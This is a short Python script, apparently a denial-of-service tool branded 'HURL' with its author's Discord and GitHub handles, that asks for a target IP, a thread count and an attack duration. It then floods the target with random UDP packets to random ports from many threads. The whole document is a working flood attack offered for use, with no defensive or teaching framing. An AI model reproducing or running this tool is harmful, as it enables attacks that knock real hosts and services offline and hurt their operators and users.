import socket
import random
import threading
import sys
import time

from os import system

system("title ")
system("mode 70, 20")

def gui():
    print(
'''
\x1b[31m╔═════════════════════════════════════════════════╗
                           _______  _           
        |\     /||\     /|(  ____ )( \          
        | )   ( || )   ( || (    )|| (          
        | (___) || |   | || (____)|| |          
        |  ___  || |   | ||     __)| |          
        | (   ) || |   | || (\ (   | |          
        | )   ( || (___) || ) \ \__| (____/\\   
        |/     \|(_______)|/   \__/(_______/    

       \x1b[38;5;56m[Discord] \x1b[31mhurl#8400 \x1b[38;5;56m[Github] \x1b[31mhvrrl                                    
\x1b[31m╚═════════════════════════════════════════════════╝
''')

def start():
    gui()
    global TARGET
    global THREADS
    global TIME
    global timeout
    try:
        TARGET = str(input("ENTER YOUR TARGET: "))
        THREADS = int(input("ENTER THREADS: "))
        TIME = float(input("ENTER ATTACK DURATION: "))
        timeout = time.time() + 1*TIME
    except:
        print("Invalid Input")
    system("cls")
    
def attack():
    try:
        bytes = random._urandom(1024)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < timeout:
            dport = random.randint(20,55500)
            sock.sendto(bytes*random.randint(5,15), (TARGET, dport))
        return
        sys.exit()
    except:
        pass
    
def main():
    while True:
        start()
        for x in range(0, THREADS):
            t1 = threading.Thread(target=attack)
            t1.start()
            t2 = threading.Thread(target=attack)
            t2.start()

        time.sleep(TIME)
        system("cls")

if __name__ == '__main__':
    main()
